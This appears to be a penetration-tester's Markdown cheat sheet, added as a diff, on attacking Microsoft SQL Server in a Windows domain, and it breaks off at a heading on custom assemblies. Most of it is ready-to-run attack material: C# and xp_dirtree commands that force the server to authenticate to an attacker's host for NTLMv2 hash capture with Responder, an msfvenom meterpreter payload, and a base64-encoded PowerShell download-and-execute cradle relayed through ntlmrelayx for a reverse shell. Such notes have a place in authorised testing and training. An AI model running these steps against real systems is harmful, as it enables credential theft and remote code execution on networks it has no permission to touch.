@@ -1,0 +1,241 @@
+---
+layout:     post
+author:     0x5c4r3
+type: docs
+permalink: MSSQL
+---
+
+
+<span style="font-size: 35px; color:red"><b>MSSQL</b></span>
+&nbsp;
+<span style="font-size: 25px; color:white"><b>Enumeration</b></span>
+
+Usually on port 1433
+If we have compromised a domain-joined workstation in the context of a domain user and we want to query the domain controller for all registered SPNs related to MS SQL:
+```shell
+setspn -T corp1 -Q MSSQLSvc/*
+```
+OR
+```powershell
+. .\GetUserSPNs.ps1
+```
+&nbsp;
+
+---
+&nbsp;
+<span style="font-size: 25px; color:white"><b>Authentication</b></span>
+This can be either an SQL server login (local account) or we can use Windows account-based (Kerberos, TGS). After that, the login is mapped to a database user account.
+
+C# Console app to authenticate against an SQL Server:
+```cs
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            String sqlServer = "dc01.corp1.com";
+            String database = "master";
+
+            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+			try
+	        {
+              con.Open();
+              Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+              Console.WriteLine("Auth failed");
+              Environment.Exit(0);
+            }
+
+			String querylogin = "SELECT SYSTEM_USER;";
+            SqlCommand command = new SqlCommand(querylogin, con);
+            SqlDataReader reader = command.ExecuteReader();
+
+			reader.Read();
+            Console.WriteLine("Logged in as: " + reader[0]);
+            reader.Close();
+
+			String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
+            command = new SqlCommand(querypublicrole, con);
+            reader = command.ExecuteReader();
+            reader.Read();
+            Int32 role = Int32.Parse(reader[0].ToString());
+            if(role == 1)
+            {
+              Console.WriteLine("User is a member of public role");
+            }
+            else
+            {
+              Console.WriteLine("User is NOT a member of public role");
+            }
+            reader.Close();
+            
+            con.Close();
+        }
+    }
+}   
+```
+&nbsp;
+
+---
+&nbsp;
+<span style="font-size: 25px; color:white"><b>mssqlclient.py</b></span>
+```shell
+mssqlclient.py <USER>:<PASS>@<IP> -port 1433 -windows-auth
+```
+&nbsp;
+
+---
+&nbsp;
+<span style="font-size: 25px; color:white"><b>UNC Path Injection</b></span>
+If we can force an SQL server to connect to an SMB share we control, the connection will include authentication data (NTLMv2 Auth).
+&nbsp;
+Start Responder:
+```shell
+sudo responder -I tap0
+```
+
+Then, to start the SMB connection to Kali machine:
+```cs
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            String sqlServer = "dc01.corp1.com"; //change here
+            String database = "master"; //change here?
+
+            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+           
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+
+            String query = "EXEC master..xp_dirtree \"\\\\<KALI_IP>\\\\test\";"; //change here
+            SqlCommand command = new SqlCommand(query, con);
+            SqlDataReader reader = command.ExecuteReader();
+            reader.Close();
+            
+            con.Close();
+        }
+    }
+}
+```
+
+OR
+find a way to submit commands to mssql and submit an exploit like:
+```
+xp_dirtree '\\<kali_machine>\file'
+```
+to get a NTLMv2 hash in responder.
+&nbsp;
+
+---
+&nbsp;
+<span style="font-size: 25px; color:white"><b>Relay My Hash</b></span>
+Technique that will yield code execution on the operating system of the SQL server without requiring us to crack the hash.
+If we have captured the NTLM hash of a domain user that is a local administrator on a remote machine, we can perform a pass-the-hash attack and gain remote code execution on another remote hostthe user's local admin of.
+
+```shell
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> -f ps1
+```
+Embed the payload in the powershell shellcode runner (the one starting with <span style="color:red">function LookupFunc {...</span> ) and save it as run.txt.
+
+Probably not working against DC (SMB Signing enabled).
+```shell
+pwsh
+$text = "(New-Object System.Net.WebClient).DownloadString('http://<KALI_MACHINE>/run.txt') | IEX"
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
+$EncodedText = [Convert]::ToBase64String($bytes)
+$EncodedText
+```
+You'll get a base64 encoded payload (<b64_payload>).
+
+Start a meterpreter multi handler on kali (<span style="color:red">sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST <LHOST>; set LPORT 443; exploit"</span>).
+
+Run:
+```shell
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t <target_ip> -c 'powershell -enc <b64_payload>'
+```
+
+Then run the SQL.exe C# code from the previews chapter (UNC Path Injection) on the machine you have access to and you should get a revshell.
+&nbsp;
+
+---
+&nbsp;
+<span style="font-size: 25px; color:white"><b>Impersonation</b></span>
+<span style="color:red">EXECUTE AS LOGIN</span>
+Enumerating login impersonation permissions
+```sql
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+```
+
+C# Code to run on the machine to issue the query
+```cs
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            String sqlServer = "dc01.corp1.com"; //change here
+            String database = "master"; //change here?
+
+            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+           
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+			
+			String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
+            SqlCommand command = new SqlCommand(query, con);
+            SqlDataReader reader = command.ExecuteReader();
+
+            while(reader.Read() == true)
+            {
+              Console.WriteLine("Logins that can be impersonated: " + reader[0]);
+            }
+            reader.Close();
+
+			con.Close();
+        }
+    }
+}
+```
+You'll get logins that allow impersonations.
+Once done, check github repo CODE_SNIPPETS to go on (MSSQL > program.cs, delete parts you don't need). TLTR
+&nbsp;
+
+---
+&nbsp;
+<span style="font-size: 25px; color:white"><b>Custom Assemblies</b></span>
+If a DB has TRUSTWORTHY property set, it's possible to use the CREATE ASSEMBLY statement to import a managed dll as object.
